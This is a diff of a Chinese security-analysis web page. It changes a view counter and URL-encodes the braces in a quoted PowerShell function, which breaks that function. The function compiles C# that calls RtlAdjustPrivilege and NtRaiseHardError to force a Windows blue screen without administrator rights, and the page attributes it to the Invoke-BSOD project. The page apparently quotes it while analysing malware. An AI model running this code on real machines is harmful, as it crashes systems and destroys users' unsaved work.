@@ -5,7 +5,7 @@
 
 
                                 阅读量   
-                                **111122**
+                                **111131**
                             
                         |
                         
@@ -59,28 +59,28 @@
 在上图的最下面，我们高亮标出了“GDKZVLJXGAPYNUGCPJNPGZQPOLPPBG”函数，该函数的代码如下：
 
 ```
-function GDKZVLJXGAPYNUGCPJNPGZQPOLPPBG(){
+function GDKZVLJXGAPYNUGCPJNPGZQPOLPPBG()%7B
 $s = @"
 using System;
 using System.Runtime.InteropServices;
-public static class C{
+public static class C%7B
 [DllImport("ntdll.dll")]
 public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
 [DllImport("ntdll.dll")]
 public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
-public static unsafe void Kill(){
+public static unsafe void Kill()%7B
 Boolean tmp1;
 uint tmp2;
 RtlAdjustPrivilege(19, true, false, out tmp1);
 NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
-}
-}
+%7D
+%7D
 "@
 $c = new-object -typename system.CodeDom.Compiler.CompilerParameters
 $c.CompilerOptions = '/unsafe'
 $a = Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c
 [C]::Kill()
-}
+%7D
 ```
 
 这是在一个月前，由Barrett Adams ([@peewpw](https://github.com/peewpw), [https://twitter.com/peewpw](https://twitter.com/peewpw) )编写的导致BSOD的代码，该代码可以从他的GitHub页面上找到（ [https://github.com/peewpw/Invoke-BSOD/blob/master/Invoke-BSOD.ps1](https://github.com/peewpw/Invoke-BSOD/blob/master/Invoke-BSOD.ps1) ）。有一点需要注意，这段代码无需管理员权限执行，即可导致BSOD。<br>
